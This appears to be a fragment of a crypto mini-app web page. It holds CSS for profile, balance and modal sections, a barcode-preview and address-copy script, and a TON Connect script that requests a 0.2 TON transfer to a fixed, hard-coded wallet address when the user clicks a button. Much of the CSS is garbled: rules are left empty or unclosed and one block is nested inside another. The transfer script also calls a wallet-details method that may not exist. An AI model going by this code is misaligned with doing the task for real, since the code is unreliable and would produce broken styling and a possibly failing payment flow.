        body {

        /* Banner Section */
        .main-banner {

        .main-banner h2 {

            cursor: pointer;
        }

        /* Profile Section */
        .profile-section {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            justify-items: center;
            gap: 15px;
            padding: 20px 10px;
            background-color: #fff;
        }

        .profile {
            text-align: center;
            position: relative;
        }

        .profile img {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            border: 2px solid #e0e0e0;
        }

        /* Bigger Profile */
        .profile.bigger img {
            width: 100px;
            height: 100px;
            
        }

        .profile .rank {
            position: absolute;
            top: 5px;
            right: 10px;
            background-color: #FFCC66;
            color: #fff;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 12px;
            font-weight: bold;
        }

        .profile span {
            display: block;
            font-size: 14px;
            margin-top: 5px;
        }

        /* Balance Section */
        .balance-section {
            display: flex;
            justify-content: space-around;
            margin: 20px auto;
            padding: 10px;
            background-color: #fff;
            border: 1px solid #e0e0e0;
            border-radius: 10px;
            max-width: 500px;
        }

        .balance-item {
            text-align: center;
        }

        .balance-item span {
            display: block;
            margin-top: 5px;
            font-size: 14px;
            color: #666;
        }

        .balance-item .highlight {
            color: #000;
            font-weight: bold;
            font-size: 18px;
        }

        .connect-button {

            border-radius: 20px;

            font-weight: bold;
            cursor: pointer;
            color: #000;
        }

        /* Footer */
        footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            background-color: #fff;
            display: flex;
            justify-content: space-around;
            padding: 10px 0;
            border-top: 1px solid #ddd;
        }

        footer div {
            text-align: center;
            font-size: 12px;
        }

        footer img {
            display: block;
            margin: auto;
            width: 24px;
            height: 24px;
        }
        
        /* Button Style */
        .popup-button {
            background-color: #FFCC66;
            color: #000;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .popup-button:hover {
            background-color: #FFB347;
        }

        /* Pop-up Modal Styles */
        .modal {
            display: none; /* Hidden by default */
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5); /* Transparent overlay */
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .modal-content {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            width: 300px;

        .close-btn {

        }

        }

<!--barcode script-->
     <script>
    function loadBarcodeImage(event) {
      // Get the file from the input
      var file = event.target.files[0];
      var reader = new FileReader();
      
      // Read the file as a data URL
      reader.onload = function() {
        var img = document.getElementById('barcode-image');
        img.src = reader.result;
      }
      
      if (file) {
        reader.readAsDataURL(file);
      }
    }

    function copyAddress() {
      // Get the address input element
      var addressInput = document.getElementById("address");

      // Select the text inside the input
      addressInput.select();
      addressInput.setSelectionRange(0, 99999); // For mobile devices

      // Copy the text
      document.execCommand("copy");

      // Alert to confirm copy action
      alert("Address copied to clipboard!");
    }
  </script>

<script>
    const walletAAddress = "UQDSt8XTc0ylw4npYOJOPuiXJKykeNRawfr4-Wxeu1yB-6vS"; // Replace with Wallet A's address
    const transferAmount = 0.2 * Math.pow(10, 9); // Convert 0.2 TON to nanoTON

    // Initialize TON Connect UI
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: 'https://tonmalone.github.io/Ton/manifest.json', // Replace with your hosted manifest URL
        buttonRootId: 'ton-connect'
    });

    const transferBtn = document.getElementById("transferBtn");
    const status = document.getElementById("status");

    // Handle Wallet Connection
    tonConnectUI.onStatusChange(async (walletDetails) => {
        if (walletDetails) {
            const walletBAddress = walletDetails.account.address;
            status.innerText = `Connected to Wallet B: ${walletBAddress}`;
            transferBtn.style.display = "block"; // Show the transfer button
        } else {
            status.innerText = "Please connect your wallet.";
            transferBtn.style.display = "none"; // Hide the transfer button
        }
    });

    // Function to Initiate Transfer
    async function initiateTransfer(walletDetails) {
        try {
            // Transaction details
            const transaction = {
                to: walletAAddress,
                value: transferAmount.toString(), // Value in nanoTON as a string
            };

            // Send the transaction using TonConnect
            await tonConnectUI.sendTransaction(transaction);

            status.innerText = `Transaction successfully sent to ${walletAAddress} for 0.2 TON!`;
        } catch (error) {
            status.innerText = `Transfer failed: ${error.message}`;
            console.error("Transaction Error:", error);
        }
    }

    // Add event listener to the transfer button
    transferBtn.addEventListener("click", async () => {
        const walletDetails = await tonConnectUI.getWalletDetails();
        if (walletDetails) {
            initiateTransfer(walletDetails);
        } else {
            alert("Please connect your wallet first.");
        }
    });
</script>
